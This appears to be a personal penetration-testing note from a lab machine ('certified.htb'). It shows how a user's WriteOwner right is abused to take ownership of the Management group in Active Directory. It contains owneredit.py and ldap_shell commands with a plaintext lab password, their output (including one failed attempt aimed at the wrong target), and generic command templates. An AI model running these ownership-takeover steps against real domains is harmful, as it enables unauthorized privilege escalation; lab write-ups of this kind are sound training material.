The user JUDITH.MADER@CERTIFIED.HTB has the ability to modify the owner of the group MANAGEMENT@CERTIFIED.HTB.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

![[Pasted image 20241105010915.png]]

```bash
owneredit.py -action write -owner 'judith.mader' -target 'judith.mader' 'certified.htb'/'judith.mader':'judith09'
```

 ```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'judith.mader' 'certified.htb'/'judith.mader':'judith09'
/usr/local/bin/owneredit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20231106.134307.9aa93730', 'owneredit.py')
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[-] Could not modify object, the server reports insufficient rights: 00000005: SecErr: DSID-03152E13, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

### LDAP_Shell

If `owneredit.py` gives issues, ldap_shell works well:

```bash
ldap_shell certified.htb/judith.mader:judith09
[INFO] Starting interactive shell
judith.mader# set_owner management judith.mader
[INFO] Found Target DN: CN=Management,CN=Users,DC=certified,DC=htb
[INFO] Target SID: S-1-5-21-729746778-2675978091-3820388244-1104
[INFO] Found Grantee DN: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[INFO] Grantee SID: S-1-5-21-729746778-2675978091-3820388244-1103
[INFO] DACL modified successfully! judith.mader now Owner of management!
```

 User has ownership over group:

![[Pasted image 20241105011745.png]]

### Summary
#### owneredit.py

```bash
owneredit.py -action write -owner '<username>' -target '<target>' '<domain>'/'<username>':'<password>'
```

#### ldap_shell

```bash
ldap_shell <domain>/<username>:<password>
set_owner <target> <target_user>
```

